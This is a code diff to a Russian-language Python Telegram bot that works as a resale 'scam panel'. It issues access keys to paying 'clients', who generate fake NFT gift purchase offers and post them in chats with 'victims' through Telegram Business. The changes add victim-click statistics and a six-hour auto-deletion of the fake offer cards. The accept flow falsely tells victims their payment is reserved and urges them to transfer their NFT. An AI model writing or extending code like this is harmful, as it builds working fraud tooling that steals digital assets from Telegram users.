@@ -6,6 +6,7 @@ import logging
 import sys
 import random
 import string
+import time
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -27,11 +28,13 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
+# Хранилища
 OFFERS = {}
-USERS = {}
+USERS = {}  # user_id: {"subscribed": bool, "my_username": str, "stats": {"created": 0, "accepted": 0}}
 KEYS = set()
+BUSINESS_CONNS = {}
 
-# Генерируем 100 ключей при старте
+# Генерация ключей
 for _ in range(100):
     key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
     KEYS.add(key)
@@ -58,41 +61,49 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# МЕНЮ АДМИНА (ВЛАДЕЛЬЦА)
+# АВТОУДАЛЕНИЕ ОФФЕРА (Фоновая задача)
 # ==========================================
-async def show_admin_menu(msg_or_cb):
+async def auto_delete_offer(chat_id: int, message_id: int, conn_id: str, delay: int = 21600): # 21600 сек = 6 часов
+    await asyncio.sleep(delay)
+    try:
+        await bot.delete_message(chat_id=chat_id, message_id=message_id, business_connection_id=conn_id)
+        log.info(f"🗑 Оффер в чате {chat_id} автоматически удален по таймеру.")
+    except Exception as e:
+        log.error(f"❌ Не удалось удалить оффер: {e}")
+
+# ==========================================
+# BUSINESS ПОДКЛЮЧЕНИЯ
+# ==========================================
+@router.business_connection()
+async def on_business_conn(conn: BusinessConnection):
+    BUSINESS_CONNS[conn.user.id] = conn.id
+    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
+
+# ==========================================
+# МЕНЮ АДМИНА
+# ==========================================
+async def show_admin_menu(target):
     text = (
         "👑 <b>Глобальная Админ-Панель</b>\n\n"
-        "<b>Как это работает:</b>\n"
-        "1. Вы генерируете ключи для доступа клиентов.\n"
-        "2. Клиенты покупают подписку, вводят ключ и получают доступ к панели скама.\n"
-        "3. Они создают офферы, а вы получаете процент с их действий.\n\n"
-        "<b>Команды:</b>\n"
+        "<b>Управление:</b>\n"
         "/keys — список доступных ключей\n"
-        "/set_default @ник — сменить дефолтного получателя"
+        "/set_default @ник — сменить дефолтного получателя\n\n"
+        "👇 Выберите раздел:"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📖 Инструкция для админа", callback_data="admin_help")],
+        [InlineKeyboardButton(text="📖 Инструкция", callback_data="admin_help")],
         [InlineKeyboardButton(text="🔑 Мои ключи", callback_data="admin_keys")]
     ])
-    
-    if isinstance(msg_or_cb, Message):
-        await msg_or_cb.reply(text, reply_markup=kb)
-    else:
-        await msg_or_cb.message.edit_text(text, reply_markup=kb)
+    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
+    else: await target.message.edit_text(text, reply_markup=kb)
 
 @router.callback_query(F.data == "admin_help")
 async def cb_admin_help(cb: CallbackQuery):
     text = (
-        "<b>📖 Инструкция для Админа (Владельца)</b>\n\n"
-        "<b>1. Как выдать доступ клиенту?</b>\n"
-        "Напишите /keys, скопируйте один ключ (например, <code>TG-A1B2C3</code>) и отправьте клиенту после оплаты.\n\n"
-        "<b>2. Как создать оффер самому (для теста)?</b>\n"
-        "Используйте ту же логику, что и клиенты:\n"
-        "<code>/offer [ссылка] [цена] [@юзер]</code>\n"
-        "Затем отправьте полученный код в чат с жертвой.\n\n"
-        "<b>3. Как поменять глобального получателя?</b>\n"
-        "Напишите <code>/set_default @ваш_ник</code>. Все новые клиенты будут использовать этот ник по умолчанию."
+        "<b>📖 Инструкция для Админа</b>\n\n"
+        "1. <b>Выдача доступа:</b> Напиши /keys, скопируй ключ и отправь клиенту.\n"
+        "2. <b>Как создать оффер:</b> Напиши <code>/offer [ссылка] [цена] [@юзер]</code> и отправь код в чат.\n"
+        "3. <b>Как поменять ник:</b> Напиши <code>/set_default @твой_ник</code>."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
     await cb.message.edit_text(text, reply_markup=kb)
@@ -112,37 +123,44 @@ async def cb_admin_back(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# МЕНЮ КЛИЕНТА (СКАМЕРА)
+# МЕНЮ КЛИЕНТА
 # ==========================================
-async def show_client_menu(msg_or_cb):
+async def show_client_menu(target):
     text = (
         "👑 <b>Панель управления офферами</b>\n\n"
         "Здесь вы можете создавать фейковые офферы и отправлять их жертвам.\n\n"
         "👇 Выберите действие:"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📖 Инструкция по настройке", callback_data="client_help")],
+        [InlineKeyboardButton(text="📊 Статистика", callback_data="client_stats")],
+        [InlineKeyboardButton(text="📖 Инструкция", callback_data="client_help")],
         [InlineKeyboardButton(text="⚙️ Настройки (изменить ник)", callback_data="client_settings")]
     ])
+    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
+    else: await target.message.edit_text(text, reply_markup=kb)
+
+@router.callback_query(F.data == "client_stats")
+async def cb_client_stats(cb: CallbackQuery):
+    uid = cb.from_user.id
+    stats = USERS.get(uid, {}).get("stats", {"created": 0, "accepted": 0})
     
-    if isinstance(msg_or_cb, Message):
-        await msg_or_cb.reply(text, reply_markup=kb)
-    else:
-        await msg_or_cb.message.edit_text(text, reply_markup=kb)
+    text = (
+        f"<b>📊 Ваша статистика</b>\n\n"
+        f"Создано офферов: <b>{stats['created']}</b>\n"
+        f"Жертва нажала 'Принять': <b>{stats['accepted']}</b>\n\n"
+        f"Чем больше нажатий, тем выше шанс, что жертва передаст подарок."
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]])
+    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.answer()
 
 @router.callback_query(F.data == "client_help")
 async def cb_client_help(cb: CallbackQuery):
     text = (
         "<b>📖 Инструкция по использованию</b>\n\n"
-        "<b>Шаг 1: Подключите бота к Business</b>\n"
-        "Зайдите в Настройки Telegram -> Telegram Business -> Чат-боты -> добавьте нашего бота (@Ndljcabjfnbot).\n\n"
-        "<b>Шаг 2: Создайте оффер</b>\n"
-        "В личке бота напишите:\n"
-        "<code>/offer [ссылка] [цена] [@username]</code>\n"
-        "Пример: <code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>\n"
-        "Бот выдаст вам код <code>of_...</code>.\n\n"
-        "<b>Шаг 3: Отправьте жертве</b>\n"
-        "Скопируйте код и отправьте его в чат с жертвой. Бот сам удалит код и пришлет красивую карточку оффера."
+        "<b>Шаг 1:</b> Подключите бота к Telegram Business (Настройки -> Telegram Business -> Чат-боты).\n"
+        "<b>Шаг 2:</b> Создайте оффер: <code>/offer [ссылка] [цена] [@username]</code>.\n"
+        "<b>Шаг 3:</b> Скопируйте код и отправьте его в чат с жертвой."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]])
     await cb.message.edit_text(text, reply_markup=kb)
@@ -178,7 +196,7 @@ async def cmd_start(msg: Message):
     
     uid = msg.from_user.id
     if uid not in USERS:
-        USERS[uid] = {"subscribed": False, "my_username": DEFAULT_RECEIVER}
+        USERS[uid] = {"subscribed": False, "my_username": DEFAULT_RECEIVER, "stats": {"created": 0, "accepted": 0}}
     
     if USERS[uid]["subscribed"]:
         await show_client_menu(msg)
@@ -200,12 +218,6 @@ async def cmd_start(msg: Message):
 # ==========================================
 # КОМАНДЫ
 # ==========================================
-@router.message(Command("keys"))
-async def cmd_keys(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    keys_list = "\n".join(list(KEYS)[:20])
-    await msg.reply(f"<b>Осталось ключей ({len(KEYS)}):</b>\n<code>{keys_list}</code>\n... и еще {max(0, len(KEYS)-20)}")
-
 @router.message(F.text.regexp(r"^/set_default\s+"))
 async def cmd_set_default(msg: Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -230,6 +242,9 @@ async def cmd_setuser(msg: Message):
     USERS[uid]["my_username"] = new_rec
     await msg.reply(f"✅ Юзернейм в офферах изменен на <b>@{new_rec}</b>.")
 
+# ==========================================
+# СОЗДАНИЕ ОФФЕРА
+# ==========================================
 @router.message(F.text.regexp(r"^/offer\s+"))
 async def cmd_offer(msg: Message):
     uid = msg.from_user.id
@@ -256,7 +271,6 @@ async def cmd_offer(msg: Message):
 
     oid = "of_" + uuid.uuid4().hex[:5]
     
-    # Для админа берем его ник, для клиента - из настроек
     buyer_name = USERS[uid]["my_username"] if not is_admin else msg.from_user.username
     
     OFFERS[oid] = {
@@ -266,6 +280,11 @@ async def cmd_offer(msg: Message):
         "buyer_username": buyer_name,
         "target_user": target_user
     }
+    
+    # Плюсуем в статистику
+    if not is_admin:
+        USERS[uid]["stats"]["created"] += 1
+        
     await msg.reply(f"✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.")
 
 # ==========================================
@@ -282,7 +301,8 @@ async def check_key(msg: Message):
     key = msg.text.strip().upper()
     if key in KEYS:
         KEYS.remove(key)
-        if uid not in USERS: USERS[uid] = {}
+        if uid not in USERS: 
+            USERS[uid] = {"stats": {"created": 0, "accepted": 0}}
         USERS[uid]["subscribed"] = True
         USERS[uid]["my_username"] = DEFAULT_RECEIVER
         
@@ -292,7 +312,7 @@ async def check_key(msg: Message):
         await msg.reply("❌ Неверный или уже использованный ключ.")
 
 # ==========================================
-# ОТПРАВКА В БИЗНЕС-ЧАТ
+# ОТПРАВКА В БИЗНЕС-ЧАТ (С АВТОУДАЛЕНИЕМ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -303,10 +323,16 @@ async def handle_business_message(msg: Message):
     offer = OFFERS.get(oid)
     if not offer: return
 
-    if msg.from_user.id != offer["buyer_id"]: return
+    if msg.from_user.id != offer["buyer_id"]: 
+        log.warning(f"Чужой код! Отправитель {msg.from_user.id}, создатель {offer['buyer_id']}")
+        return
 
-    conn_id = msg.business_connection_id
-    if not conn_id: return
+    conn_id = BUSINESS_CONNS.get(msg.from_user.id)
+    
+    if not conn_id:
+        log.error(f"❌ У пользователя {msg.from_user.id} нет Business connection!")
+        await bot.send_message(msg.chat.id, "❌ Ошибка: Вы не подключили бота к Telegram Business.")
+        return
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     target_user = offer["buyer_username"] 
@@ -326,10 +352,14 @@ async def handle_business_message(msg: Message):
     ])
     
     try:
-        await bot.send_message(
+        sent_msg = await bot.send_message(
             chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
             reply_markup=kb, disable_web_page_preview=False
         )
+        
+        # Запускаем фоновое автоудаление на 6 часов
+        asyncio.create_task(auto_delete_offer(msg.chat.id, sent_msg.message_id, conn_id, 21600))
+        
         await asyncio.sleep(2)
         try: await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
         except: pass
@@ -344,6 +374,11 @@ async def on_accept1(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     if not offer: return
+    
+    # Плюсуем в статистику создателя оффера
+    buyer_id = offer["buyer_id"]
+    if buyer_id in USERS and "stats" in USERS[buyer_id]:
+        USERS[buyer_id]["stats"]["accepted"] += 1
     
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     text = f"<b>Сумма {price_str} зарезервирована.</b>\n\nЧтобы завершить сделку:\n1. Ознакомьтесь с инструкцией.\n2. Нажмите «Передать NFT»."
@@ -380,10 +415,6 @@ async def on_reject(cb: CallbackQuery):
     try: await cb.message.edit_reply_markup(reply_markup=None)
     except: pass
     await cb.answer("Вы отклонили предложение.")
-
-@router.business_connection()
-async def on_business_conn(conn: BusinessConnection):
-    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
 async def main():
     log.info("Starting bot...")
